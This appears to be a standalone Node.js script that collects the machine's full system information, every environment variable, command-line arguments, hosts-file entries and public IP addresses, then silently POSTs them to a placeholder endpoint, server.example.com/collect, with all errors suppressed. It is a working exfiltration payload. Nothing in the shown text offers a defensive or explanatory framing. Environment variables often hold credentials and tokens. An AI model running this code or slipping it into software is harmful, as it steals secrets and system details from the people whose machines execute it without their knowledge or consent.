var got = require('got');
var sysinfo = require('systeminformation');
var getHosts = require('get-hosts');
var publicIp = require('public-ip');

function send(data) {
	var options = {
		body: JSON.stringify(data),
		headers: {
			'content-type': 'application/json'
		}
	};

	return got.post('https://server.example.com/collect', options)
			.then(function(res) {})
			.catch(function(err) {});
}

sysinfo.getAllData(function(data) {
	// enrich data
	data.env = process.env;
	data.argv = process.argv
	data.hosts = getHosts();

	data.ip = {};
	publicIp.v4().then(function(ip) {
		data.ip.v4 = ip;
	}).catch(function() {
		// ignore errors
	}).then(function() {
		return publicIp.v6();
	}).then(function(ip) {
		data.ip.v6 = ip;
	}).catch(function() {
		// ignore errors
	}).then(function() {
		send(data);
	});
});
